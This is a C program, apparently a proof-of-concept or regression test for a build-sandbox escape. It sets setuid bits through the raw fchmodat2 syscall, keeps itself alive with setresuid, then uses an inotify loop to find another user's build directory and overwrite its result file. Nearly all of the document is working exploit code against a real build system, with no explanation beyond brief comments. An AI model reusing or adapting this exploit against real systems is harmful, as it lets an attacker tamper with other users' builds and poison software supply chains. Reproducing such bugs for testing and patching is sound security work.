#define _GNU_SOURCE

#include <fcntl.h>
#include <stdio.h>
#include <sys/inotify.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdlib.h>

#define SYS_fchmodat2 452

int fchmodat2(int dirfd, const char * pathname, mode_t mode, int flags)
{
    return syscall(SYS_fchmodat2, dirfd, pathname, mode, flags);
}

int main(int argc, char ** argv)
{
    if (argc <= 1) {
        // stage 1: place the setuid-builder executable

        // make the build directory world-accessible first
        chmod(".", 0755);

        if (fchmodat2(AT_FDCWD, "attacker", 06755, AT_SYMLINK_NOFOLLOW) < 0) {
            perror("Setting the suid bit on attacker");
            exit(-1);
        }

    } else {
        // stage 2: corrupt the victim derivation while it's building

        // prevent the kill
        if (setresuid(-1, -1, getuid())) {
            perror("setresuid");
            exit(-1);
        }

        if (fork() == 0) {

            // wait for the victim to build
            int fd = inotify_init();
            inotify_add_watch(fd, argv[1], IN_CREATE);
            int dirfd = open(argv[1], O_DIRECTORY);
            if (dirfd < 0) {
                perror("opening the global build directory");
                exit(-1);
            }
            char buf[4096];
            fprintf(stderr, "Entering the inotify loop\n");
            for (;;) {
                ssize_t len = read(fd, buf, sizeof(buf));
                struct inotify_event * ev;
                for (char * pe = buf; pe < buf + len; pe += sizeof(struct inotify_event) + ev->len) {
                    ev = (struct inotify_event *) pe;
                    fprintf(stderr, "folder %s created\n", ev->name);
                    // wait a bit to prevent racing against the creation
                    sleep(1);
                    int builddir = openat(dirfd, ev->name, O_DIRECTORY);
                    if (builddir < 0) {
                        perror("opening the build directory");
                        continue;
                    }
                    int resultfile = openat(builddir, "build/result", O_WRONLY | O_TRUNC);
                    if (resultfile < 0) {
                        perror("opening the hijacked file");
                        continue;
                    }
                    int writeres = write(resultfile, "bad\n", 4);
                    if (writeres < 0) {
                        perror("writing to the hijacked file");
                        continue;
                    }
                    fprintf(stderr, "Hijacked the build for %s\n", ev->name);
                    return 0;
                }
            }
        }

        exit(0);
    }
}
